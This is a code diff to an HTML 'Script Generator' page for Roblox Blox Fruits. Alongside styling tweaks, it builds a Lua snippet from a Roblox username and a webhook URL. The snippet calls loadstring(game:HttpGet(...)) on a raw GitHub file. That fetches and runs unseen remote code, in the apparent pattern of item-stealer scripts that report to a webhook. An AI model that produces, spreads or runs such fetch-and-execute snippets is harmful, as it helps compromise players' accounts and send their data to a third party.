@@ -53,12 +53,13 @@
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
         }
         .popup input {
             display: block;
-            margin: 10px 0;
-            padding: 5px;
-            width: 90%;
+            margin: 10px auto;
+            padding: 8px;
+            width: 80%;
         }
         .popup button {
             background: #ff0080;
@@ -67,30 +68,39 @@
             padding: 10px;
             border-radius: 5px;
             cursor: pointer;
+            margin-top: 10px;
+        }
+        .popup button:hover {
+            background: #ff0055;
         }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
     <div class="container">
-        <button class="game-button" onclick="openPopup('Blox Fruits')">Blox Fruits</button>
+        <button class="game-button" onclick="openPopup()">Blox Fruits</button>
     </div><div id="popup" class="popup">
     <h2>Enter Details</h2>
     <input type="text" id="username" placeholder="Enter Roblox Username">
     <input type="text" id="webhook" placeholder="Enter Webhook URL">
     <button onclick="generateScript()">Generate Script</button>
+    <button onclick="closePopup()">Close</button>
 </div>
 
 <script>
-    function openPopup(game) {
+    function openPopup() {
         document.getElementById('popup').style.display = 'block';
+    }
+    function closePopup() {
+        document.getElementById('popup').style.display = 'none';
     }
     function generateScript() {
         let username = document.getElementById('username').value;
         let webhook = document.getElementById('webhook').value;
-        let script = `Username = "${username}"
+        if (username && webhook) {
+            let script = `Username = "${username}"
 
-Webhook = "${webhook}" loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`; alert("Generated Script:\n" + script); document.getElementById('popup').style.display = 'none'; } </script>
+Webhook = "${webhook}" loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`; alert("Generated Script:\n" + script); } else { alert("Please enter both a username and webhook."); } } </script>
 
 </body>
 </html>
